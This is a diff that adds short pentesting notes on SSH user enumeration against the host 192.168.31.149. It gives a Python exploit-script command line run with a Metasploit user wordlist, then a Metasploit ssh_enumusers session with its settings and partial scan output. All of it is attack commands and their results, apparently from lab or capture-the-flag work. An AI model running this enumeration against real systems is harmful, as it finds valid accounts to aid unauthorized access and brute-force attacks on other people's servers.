@@ -1,0 +1,21 @@
+
+  == SSH user enumeration ==
+  
+1)
+python ./40136.py 192.168.31.149 -U /usr/share/wordlists/metasploit/unix_users.txt -e --trials 5 --bytes 10
+
+
+
+2) 
+msf > use auxiliary/scanner/ssh/ssh_enumusers
+msf auxiliary(scanner/ssh/ssh_enumusers) > set RHOSTS 192.168.31.149
+RHOSTS => 192.168.31.149
+msf auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
+USER_FILE => /usr/share/wordlists/metasploit/unix_users.txt
+msf auxiliary(scanner/ssh/ssh_enumusers) > run
+
+[*] 192.168.31.149:22 - SSH - Checking for false positives
+[*] 192.168.31.149:22 - SSH - Starting scan
+[-] 192.168.31.149:22 - SSH - User '4Dgifts' not found
+[-] 192.168.31.149:22 - SSH - User 'EZsetup' not found
+[-] 192.168.31.149:22 - SSH - User 'OutOfBox' not found
